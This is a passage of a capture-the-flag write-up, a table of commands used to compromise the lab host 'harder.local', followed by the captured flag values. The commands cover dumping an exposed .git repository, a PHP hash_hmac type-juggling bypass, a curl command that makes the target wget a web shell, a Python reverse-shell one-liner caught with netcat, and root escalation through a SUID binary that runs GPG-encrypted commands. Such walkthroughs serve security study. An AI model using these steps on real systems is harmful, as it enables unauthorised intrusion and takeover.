| `wget http://pwd.harder.local/.git/index`                                | Downloads exposed git index file                                                                |
| `cat index`                                                              | Views raw (binary) git index contents                                                           |
| `strings index`                                                          | Extracts readable filenames/strings from binary git index                                       |
| `./gitdumper.sh http://pwd.harder.local/.git/ .`                         | Dumps the entire exposed `.git` repo from the web server                                        |
| `ls -la`                                                                 | Lists directory contents including hidden files                                                 |
| `cd .git/`                                                               | Enters the downloaded git directory                                                             |
| `ls`                                                                     | Lists directory contents                                                                        |
| `cat logs/HEAD`                                                          | Shows git commit history/reflog                                                                 |
| `git checkout .`                                                         | Restores tracked files from git objects/index                                                   |
| `cat .gitignore`                                                         | Reveals filenames git was told to ignore (hints at sensitive files)                             |
| `cat index.php`                                                          | Views PHP source code                                                                           |
| `cat hmac.php`                                                           | Views PHP source implementing HMAC auth check                                                   |
| `php -r "echo hash_hmac('sha256', Array(), 'secret')== false;"`          | Tests whether passing an array causes `hash_hmac()` to fail/return false (type juggling bypass) |
| `php -r "echo hash_hmac('sha256', 'pwd.harder.local', false) . \"\n\";"` | Crafts a valid HMAC signature using the bypassed (false) secret                                 |
| `python -m http.server 80`                                               | Hosts a local HTTP server to serve a payload file                                               |
| `curl -X POST http://shell.harder.local/ ... --data "cmd=wget ..."`      | Sends command through the vulnerable endpoint to pull a web shell onto the target               |
| `shell.harder.local/sh.php?cmd=python3 -c '...pty.spawn...'`             | Executes a Python reverse shell one-liner via the uploaded web shell                            |
| `nc -lvnp 8088`                                                          | Starts a netcat listener to catch the reverse shell connection                                  |
| `find / -perm -4000 2>/dev/null`                                         | Finds SUID binaries on the system                                                               |
| `getcap -r / 2>/dev/null`                                                | Finds files with Linux capabilities set                                                         |
| `cat /etc/crontab`                                                       | Attempts to view scheduled cron jobs                                                            |
| `strings /usr/local/bin/execute-crypted`                                 | Extracts readable strings from the SUID binary                                                  |
| `find / -type f -user www 2>/dev/null`                                   | Finds all files owned by the `www` user                                                         |
| `cat /etc/periodic/15min/evs-backup.sh`                                  | Views a periodic backup script (contains credentials)                                           |
| `strings /usr/local/bin/execute-crypted \| more`                         | Reviews binary strings, revealing reference to `run-crypted.sh`                                 |
| `ls -l /usr/local/bin/run-crypted.sh`                                    | Checks file permissions on the referenced script                                                |
| `cat /usr/local/bin/run-crypted.sh`                                      | Views the script that decrypts and runs GPG-encrypted commands as root                          |
| `/usr/local/bin/execute-crypted`                                         | Runs the SUID binary to confirm it executes as root                                             |
| `find / -type f -name "root@harder.local*" 2>/dev/null`                  | Searches for a backed-up GPG key file                                                           |
| `cat /var/backup/root@harder.local.pub`                                  | Views the root user's public GPG key                                                            |
| `gpg --import /var/backup/root@harder.local.pub`                         | Imports the root's public key into local keyring                                                |
| `gpg --list-keys`                                                        | Confirms the key was imported                                                                   |
| `echo -n "cat /root/root.txt" > command`                                 | Creates a command file to be encrypted                                                          |
| `gpg -e -r "Administrator" command`                                      | Encrypts the command file using root's public key                                               |
| `/usr/local/bin/execute-crypted command.gpg`                             | Runs the encrypted command as root via the SUID binary, revealing the root flag                 |

---

## 🚩 Flags Found

| Flag      | Value                            |
| --------- | -------------------------------- |
| User flag | 7e88bf11a579dc5ed66cc798cbe49f76 |
| Root flag | 3a7bd72672889e0756b09f0566935a6c |

---

## 📎 Resources Used

- [PHP function](https://www.php.net/manual/en/function.hash-hmac.php)

---

